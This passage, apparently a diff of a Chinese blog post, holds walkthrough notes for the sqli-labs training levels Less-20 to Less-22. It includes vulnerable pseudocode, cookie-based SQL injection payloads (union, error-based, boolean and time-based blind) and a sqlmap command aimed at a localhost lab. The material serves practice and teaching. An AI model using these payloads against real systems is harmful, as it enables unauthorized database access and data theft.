+<p>select ename,sal from emp order by sal desc;<br>由大到小排序（降序关键字desc）<br>select ename,sal from emp order by sal asc;<br>由小到大排序（升序关键字 asc）</p>
+</blockquote>
+</div><h2 id="0x13-less-20"><a href="#0x13-less-20" class="headerlink" title="0x13 less-20"></a>0x13 less-20</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=&#39;$cookee&#39;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, time()+<span class="number">3600</span>);</span><br><span class="line">			print_r(mysqli_error());			</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>], time()-<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">联合</span><br><span class="line">    Cookie: uname=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">报错</span></span><br><span class="line"><span class="string">    Cookie: uname=-1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">布尔</span><br><span class="line">    Cookie: uname=admin<span class="string">&#x27; and if(substring(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,1,0)#</span></span><br><span class="line"><span class="string">时间</span></span><br><span class="line"><span class="string">    Cookie: uname=admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(substring(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">2</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>sqlmap：</p>
+<p><code>--level</code> 设置为 <strong>2</strong>及以上可以自动测试Cookie注入</p>
+<p>或者</p>
+<p>设置<code>--cookie</code>参数，<code>--cookie=&quot;uname=admin&quot;</code>,手动通过<code>*</code>来标记注入也比较方便：<code>--cookie=&quot;uname=admin*&quot;</code></p>
+</div><h2 id="0x14-less-21"><a href="#0x14-less-21" class="headerlink" title="0x14 less-21"></a>0x14 less-21</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>uname=(&#39;$cookee&#39;)</code></td>
+</tr>
+</tbody></table>
+<p>和less-20基本一样，只不过这里对cookie进行base64加密。且闭合的方式也不一样</p>
+<p>如果使用sqlmap进行注入，只需加入参数<code>--tamper=&quot;base64encode&quot;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-21/&quot;</span> --cookie=<span class="string">&quot;uname=*&quot;</span> --tamper=<span class="string">&quot;base64encode&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+</div><h2 id="0x15-less-22"><a href="#0x15-less-22" class="headerlink" title="0x15 less-22"></a>0x15 less-22</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=&quot;$cookee&quot;</code></td>
+</tr>
+</tbody></table>
+<p>和less-21基本一样，只闭合的方式不一样</p>
+
+</div>
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/>http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-14T09:38:48+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 14, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sqlilabs/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>sqlilabs</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>做题笔记</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/&title=sqlilabs_Page-1 - Scylamb's Blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/&title=sqlilabs_Page-1 - Scylamb's Blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/&title=sqlilabs_Page-1 - Scylamb's Blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>sqlilabs_Page-4</p>
+          <p class='content'>sqli_labs_Page-4前言之前没坚持做完sqlilabs，这次来填坑
+参考：国光    sqlilabs注入天书
+注：大量复制原文，因为这两篇写的很好了，不重复造轮子了
+0x35 le...</p>
+        </a>
+      
+      
+        <a class='next' href='/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-3/'>
+          <p class='title'>sqlilabs_Page-3<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>前言之前没坚持做完sqlilabs，这次来填坑
+参考：国光    sqlilabs注入天书
+注：大量复制原文，因为这两篇写的很好了，不重复造轮子了
+堆叠注入堆叠注入的局限性:
+
+并不是每一个环境...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+  
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+
+    
+      <div id="beaudar_container"></div>
+    
+
+    
+      <!-- Custom Files comment begin-->
+      
+      <!-- Custom Files comment end-->
+    
+  </article>
+  
+
+
+
+
+
+
 </div>
 <aside id='l_side'>
   
@@ -2495,121 +2937,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Scylamb's Blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
 
 
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/ctf/" href="/categories/ctf/"
-            id="categoriesctf"
-            ><div class='name'>ctf</div><div class='badge'>(4)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/sqlilabs/" style="font-size: 14px; color: #999">sqlilabs</a> <a href="/tags/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 14px; color: #999">做题笔记</a>
-    </div>
-  </section>
-
-
-  
 
   
 
@@ -2620,13 +2949,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="sqlilabs_Page-1";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
@@ -3174,7 +3504,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       volantis.APlayerController = {};
     
-    volantis.js('/js/rightMenu.js?time=1629382751088')
+    volantis.js('/js/rightMenu.js?time=1629382751079')
   </script>
 
 
@@ -3188,19 +3518,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1629382751088")
+        volantis.js("/js/plugins/sites.js?time=1629382751079")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1629382751088")
+        volantis.js("/js/plugins/friends.js?time=1629382751079")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1629382751088")
+        volantis.js("/js/plugins/contributors.js?time=1629382751079")
       }
     
   };
@@ -3318,7 +3648,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-<script src="/js/app.js?time=1629382751088.js"></script>
+<script src="/js/app.js?time=1629382751079.js"></script>
 
 
 <!-- optional -->
@@ -3331,7 +3661,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1629382751088");
+    return volantis.js("/js/search/hexo.js?time=1629382751079");
   }
 
   function loadSearchService() {
@@ -3599,8 +3929,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1629382751088')
-      volantis.js('/js/message.js?time=1629382751088', () => {
+      volantis.css('/css/message.css?time=1629382751079')
+      volantis.js('/js/message.js?time=1629382751079', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -3644,8 +3974,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1629382751088')
-      volantis.js('/js/message.js?time=1629382751088', () => {
+      volantis.css('/css/message.css?time=1629382751079')
+      volantis.js('/js/message.js?time=1629382751079', () => {
         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
@@ -3806,7 +4136,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Scylamb's Blog","url":"http://scylamb.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://scylamb.github.io/","name":"Scylamb's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://scylamb.github.io/archives/","name":"Archive"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Scylamb's Blog","url":"http://scylamb.github.io/","keywords":"aaa","description":"Blog","author":{"@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"}},"publisher":{"@type":"Organization","name":"Scylamb's Blog","url":"http://scylamb.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://scylamb.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Scylamb's Blog","url":"http://scylamb.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://scylamb.github.io/","name":"Scylamb's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://scylamb.github.io/categories/ctf/","name":"ctf"}},{"@type":"ListItem","position":3,"item":{"@id":"http://scylamb.github.io/ctf/做题笔记/sqli-labs/sqlilabs_Page-1/","name":"sqlilabs_Page-1"}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqlilabs_Page-1","description":"","datePublished":"2021-04-03T01:25:00.000Z","dateModified":"2021-04-14T01:38:48.742Z","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/"},"author":{"@type":"Person"},"publisher":{"@type":"Organization","name":"Scylamb's Blog","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/","wordCount":0,"articleSection":"ctf","keywords":"sqlilabs,做题笔记"}]</script>
 
 
 <!-- more -->
